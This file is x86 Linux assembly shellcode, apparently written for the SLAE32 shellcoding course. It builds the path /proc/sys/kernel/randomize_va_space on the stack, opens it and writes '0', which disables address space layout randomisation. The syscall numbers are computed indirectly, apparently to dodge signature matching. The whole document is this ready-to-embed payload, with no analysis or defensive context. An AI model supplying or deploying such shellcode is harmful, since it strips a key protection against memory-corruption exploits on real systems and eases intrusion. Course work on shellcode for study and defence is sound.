; For SLAE32
; Howard McGreehan

global _start

section .text
_start:

	xor    eax,eax

	push   eax
	push   0x65636170
	push   0x735f6176
	push   0x5f657a69
	push   0x6d6f646e
	push   0x61722f6c
	push   0x656e7265
	push   0x6b2f7379
	push   0x732f636f
	push   0x72702f2f

	mov    ebx,esp

	mov al, 0x2
	mov ch, al
	mov cl, 0xbc
	imul eax, 0x4

	int    0x80
	mov    ebx,eax
	push   eax
	
	push 0x30
	pop edx
	mov dh, 0x3a 	

	push   dx
	mov    ecx,esp
	xor    edx,edx
	
	mov dl, 0x2
	mov al, 0x2
	mul dl
	dec edx
	int    0x80
	
	add al, 0x5
	int    0x80
	inc    eax
	int    0x80
